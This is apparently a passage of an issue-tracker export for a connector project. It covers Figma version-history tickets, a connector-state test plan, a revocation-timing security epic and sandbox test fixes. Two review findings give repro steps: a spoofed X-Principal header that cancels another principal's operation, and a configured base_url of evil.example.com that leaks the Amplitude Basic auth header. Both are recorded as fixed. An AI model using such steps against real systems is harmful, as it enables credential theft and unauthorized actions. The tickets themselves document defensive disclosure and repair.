 {"id":"flywheel_connectors-70p","title":"fcp.figma: Version history access and comparison","description":"# fcp.figma: Version history access and comparison (FCP2)

## Goal
Allow agents to access Figma version history so they can:
- inspect change timelines
- correlate design changes with code changes
- retrieve a specific historical version for export/comparison

## Scope
- List versions for a file.
- Get metadata for a specific version.
- Optional: retrieve the file at a specific version (keyed request).
- Optional: compute a lightweight diff summary (node counts/changed nodes) when feasible.

## Capability model (illustrative)
- `figma.versions.read`
- `figma.files.read`

## FCP2 requirements
- Single-zone binding.
- NetworkConstraints pinned.
- Treat version labels/descriptions as tainted.

## Deliverables
- Operation schemas:
  - `figma.version.list`
  - `figma.version.get`
  - Optional: `figma.file.get_at_version`

## Test strategy (MUST)
- Mock-only tests for:
  - pagination
  - error mapping (version not found)

## Acceptance criteria
- Agents can reliably fetch and reference historical versions.

Operation: figma.list_file_versions returns version IDs, labels, descriptions, users, timestamps with pagination. 83 tests pass.","created_at":"2026-03-03T00:01:08Z"}]}
 {"id":"flywheel_connectors-70pq","title":"TEST: Connector State Unit Tests (State Chain, Failover, Fork Detection, Adversarial)","description":"# TEST: Connector State Unit Tests

## Goal
Comprehensive tests verifying connector state persistence, failover, and fork detection.

## Test Categories

### 1. State Schema Tests
- ConnectorStateRoot schema validation
- ConnectorStateObject schema validation (incl. lease_seq, lease_object_id)
- ConnectorStateSnapshot schema validation
- Golden vectors for all state object types
- State schema versioning validation

### 2. State Chain Tests
- Append new state object to chain
- Verify chain integrity (hash linking)
- State lookup by cursor/position
- Chain traversal and iteration
- Compaction preserves chain integrity

### 3. Singleton-Writer Fencing Tests (NORMATIVE)
- State writes MUST include lease_seq and lease_object_id
- Stale lease holder write attempt (MUST be rejected deterministically)
- Valid lease holder can write
- Lease renewal during active writes
- ObjectHeader.refs MUST reference the Lease object

### 4. Failover Tests
- Failover resumes from last committed state
- No duplicate processing after failover
- State cursor preserved across restarts
- Graceful vs crash failover scenarios

### 5. Fork Detection Tests (CRITICAL)
- Two competing state objects with same prev = SAFETY INCIDENT
- Fork detection triggers pause + audit
- Fork audit event contains correct evidence
- Recovery path after fork detection

### 6. Snapshot Tests
- Snapshot creation at configured cadence
- Snapshot compaction rules
- Replay from snapshot + delta
- Snapshot integrity verification

### 7. Migration / Upgrade Tests (V2-only; NO backwards compatibility)
We do **not** support legacy/older state schema reads.

- State schema version migration hints exist and are **informational only** (NOT auto-executed).
- Fail-closed behavior for unknown/older state schema versions:
  - deterministic error code
  - AuditEvent emitted with evidence
- If/when a migration tool exists:
  - migrations must be explicit, deterministic, and produce new content-addressed objects
  - golden vectors cover upgrade paths

## Logging Requirements
- Structured JSON logs with:
  - `test_name`, `state_object_id`, `chain_height`
  - `lease_seq`, `writer_identity`
  - `expected_outcome`, `actual_outcome`
  - Fork detection events with full evidence

## Adversarial Tests
- Byzantine writer attempts (wrong lease, forged lease_seq)
- Replay attacks on state objects
- State object with invalid prev reference
- Concurrent fork attempts

## Acceptance Criteria
- All tests deterministic (no flaky behavior)
- Fork detection tests are thorough and documented
- Lease fencing is mechanically enforced
- Logging sufficient for post-mortem analysis
","status":"closed","priority":0,"issue_type":"task","owner":"jeff141421@gmail.com","created_at":"2026-01-15T08:50:00.380046857Z","created_by":"Dicklesworthstone","updated_at":"2026-01-16T05:18:34.680083213Z","closed_at":"2026-01-16T05:18:34.680083213Z","close_reason":"Completed: 75 comprehensive tests for connector_state module covering CBOR golden vectors, state chain integrity, singleton-writer fencing, failover, fork detection, snapshots, CRDT deltas, and adversarial scenarios","source_repo":".","compaction_level":0,"original_size":0,"labels":["fcp2","mvp","state","testing"],"dependencies":[{"issue_id":"flywheel_connectors-70pq","depends_on_id":"flywheel_connectors-1n78.33","type":"blocks","created_at":"2026-03-02T18:31:41Z","created_by":"import","metadata":"{}","thread_id":""},{"issue_id":"flywheel_connectors-70pq","depends_on_id":"flywheel_connectors-1n78.35","type":"blocks","created_at":"2026-03-02T18:31:41Z","created_by":"import","metadata":"{}","thread_id":""}]}
 {"id":"flywheel_connectors-70qcc","title":"[MOR] Epic: Revocation Enforcement Critical Timing Gaps","status":"closed","priority":0,"issue_type":"epic","created_at":"2026-04-08T03:30:32.984337Z","created_by":"jemanuel","updated_at":"2026-04-11T00:52:59.025513Z","closed_at":"2026-04-11T00:52:59.024768Z","source_repo":".","compaction_level":0,"original_size":0,"labels":["MOR-finding-C1","revocation","security"],"comments":[{"id":2626,"issue_id":"flywheel_connectors-70qcc","author":"jemanuel","text":"MODES-OF-REASONING FINDING C1 — Confidence: 0.95 — Supporting modes: F7 (Systems-Thinking), H2 (Adversarial-Review), F4 (Failure-Mode), J1 (Deontic), E1 (Belief-Revision). PROBLEM: The revocation pipeline has UNBOUNDED LATENCY, TOCTOU RACE CONDITIONS, and PROBABILISTIC FALSE POSITIVES that collectively undermine the first-class revocation security claim. This was the highest-confidence convergent finding across all 10 analytical modes. EVIDENCE: (1) F7: negative feedback loop where Strict-mode causes rejection cascades; BestEffort creates vulnerability windows. Delay between issuance and enforcement is not bounded by the system. (2) H2: TOCTOU vulnerability ranked #1 CRITICAL. XOR filter false positives ~40 per 10K revocations. (3) F4: FM-6 RPN=240 revoked token accepted in lag window. Cascade: FROST DKG failure blocks owner signing blocks revocation. (4) J1: FreshnessPolicy tiers shift enforcement from mechanical to operational discipline. (5) E1: revocation claimed PROVEN but only for hash-linked mechanics; freshness is still operational choice. KEY FILES: crates/fcp-core/src/revocation.rs, crates/fcp-core/src/capability.rs, crates/fcp-mesh/src/gossip.rs, crates/fcp-manifest/src/lib.rs. ACCEPTANCE: Seal pattern for atomic check-use, exact membership for revocation, mandatory FreshnessClass per operation, quorum-signed SLA, bounded-time integration tests.","created_at":"2026-04-08T03:30:45Z"},{"id":2676,"issue_id":"flywheel_connectors-70qcc","author":"jemanuel","text":"All C1.x children closed: C1.1 (RevocationSeal), C1.2 (exact membership verification), C1.3 (RevocationFreshnessClass, closed earlier), C1.4 (RevocationSlaChecker), C1.5 (priority gossip push), C1.6 (10 integration tests). Epic complete.","created_at":"2026-04-11T00:52:58Z"}]}

Verification: cd connectors/qq && CARGO_TARGET_DIR=/tmp/fcp-cod4-fixed cargo test --lib simulate passed 4/4; CARGO_TARGET_DIR=/tmp/fcp-cod4-fixed cargo test --tests passed 106 lib + 0 bin + 1 connector-suite test. ubs --staged --only=rust passed with exit 0.","created_at":"2026-04-27T21:49:23Z"}]}
 {"id":"flywheel_connectors-71lku","title":"[REVIEW][HIGH] fcp-host: public /rpc/cancel trusts spoofable X-Principal header","description":"file: crates/fcp-host/src/bin/fcp-host.rs:2693-2695, 4208-4235; crates/fcp-host/src/cancellation.rs:168-180

repro:
1. Start any authenticated invoke for principal user:test and capture its operation_id while it is still in flight.
2. From a second caller with no bearer auth and no capability token, POST /rpc/cancel (or /rpc/operations/cancel) with that operation_id and header X-Principal: user:test.
3. The public router dispatches cancel_handler, which forwards only the caller-supplied header principal into CancellationController::cancel.
4. cancellation.rs accepts the plain string match and cancels another principal's operation.

why this is real:
- /rpc/cancel and /rpc/operations/cancel are mounted on the public app router, not the protected_routes router guarded by admin_auth_middleware.
- cancel_handler does not require a capability token, session proof, or admin bearer; it trusts only extract_principal_header(&headers).
- CancellationController::cancel authorizes by plain string equality on the stored owner.

suggested fix:
- require authenticated cancellation proof (for example the same live capability-token principal model as invoke, or a dedicated signed cancel token), or move the cancel route behind a real auth layer instead of trusting X-Principal alone.","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-04-26T00:46:41.744995Z","created_by":"jemanuel","updated_at":"2026-04-26T01:04:25.627791Z","closed_at":"2026-04-26T01:04:25.627293Z","source_repo":".","compaction_level":0,"original_size":0,"comments":[{"id":2896,"issue_id":"flywheel_connectors-71lku","author":"jemanuel","text":"Fixed in commit e2cb9fc5 (cc_2). Moved /rpc/cancel + /rpc/operations/cancel from public app router into protected_routes, gated by existing admin_auth_middleware (Bearer token + owner zone header). 3 regression tests added: spoofed X-Principal alone → 403, /rpc/operations/cancel alias → 403, wrong bearer → 403. Tests use tower::ServiceExt::oneshot to exercise the full routing layer. Behavior change noted in commit message: tenant self-cancel via plain X-Principal no longer works; restoring tenant self-cancel without the bypass requires threading a capability_token through CancellationRequest (larger refactor, separate scope).","created_at":"2026-04-26T01:04:25Z"}]}
 {"id":"flywheel_connectors-752ao","title":"[REVIEW-A9-CROSS][HIGH] connectors/amplitude/src/connector.rs:48: configure accepts arbitrary base_url and exfiltrates Basic auth","description":"AmplitudeConfig::from_params accepts any caller-supplied base_url at connectors/amplitude/src/connector.rs:48-83, and handle_configure passes it straight into AmplitudeClient::new at connectors/amplitude/src/connector.rs:380-388. The only host check is base_url_policy() in provisioning_readiness at connectors/amplitude/src/connector.rs:86-87 / 885-912, which only surfaces diagnostics and does not block configuration. AmplitudeClient::new in connectors/amplitude/src/client.rs:76-90 stores the URL verbatim, so invoke-time requests send the Basic Authorization header to attacker-controlled hosts.

Repro:
1. configure with {"api_key":"k","secret_key":"s","base_url":"https://evil.example.com"}
2. handshake succeeds because configure never enforces base_url_policy
3. invoke any read operation and observe a request to evil.example.com with the Amplitude Basic auth header

Suggested fix: enforce the same host/scheme policy during from_params/configure, not just readiness diagnostics, and add a regression test that evil.example.com is rejected before the client is constructed.","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-04-27T03:10:53.668854Z","created_by":"jemanuel","updated_at":"2026-04-27T03:20:31.121266Z","closed_at":"2026-04-27T03:20:31.120991Z","close_reason":"Fixed in a49c2647: enforce Amplitude base_url allowlist at configure time","source_repo":".","compaction_level":0,"original_size":0}
 {"id":"flywheel_connectors-75965","title":"[fix] fcp-sandbox: 7 test failures from LEB128 assertion, CIDR error handling, and macOS path canonicalization","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-03-26T21:23:00.478406Z","created_by":"jemanuel","updated_at":"2026-03-26T21:23:13.162350Z","closed_at":"2026-03-26T21:23:13.160958Z","close_reason":"All 543 fcp-sandbox lib tests pass. 7 bugs fixed: LEB128 test assertion, HTTP method test, CIDR production bug, 4 macOS path tests. Clippy clean.","source_repo":".","compaction_level":0,"original_size":0,"comments":[{"id":2029,"issue_id":"flywheel_connectors-75965","author":"jemanuel","text":"SunnyMoose fixed 7 test failures in fcp-sandbox: (1) test_leb128_128 had wrong expected value (128 vs 256 for [0x80,0x02]); fixed to test correct LEB128 encoding [0x80,0x01]=128. (2) test_connector_runner_validate_http_allowed incorrectly expected GET to fail when egress is host-based not method-based; fixed assertion. (3) test_cidr_deny_invalid_cidr_string_ignored: production bug where invalid CIDR strings block all traffic instead of being silently skipped; fixed egress.rs to warn-and-skip. (4-7) Four macOS path canonicalization failures (/tmp vs /private/tmp): fixed verify_file_access in macos.rs to canonicalize policy paths before comparison, and fixed sandbox.rs symlink test to use canonicalized temp dir. All 543 sandbox tests pass, clippy clean.","created_at":"2026-03-26T21:23:12Z"}]}
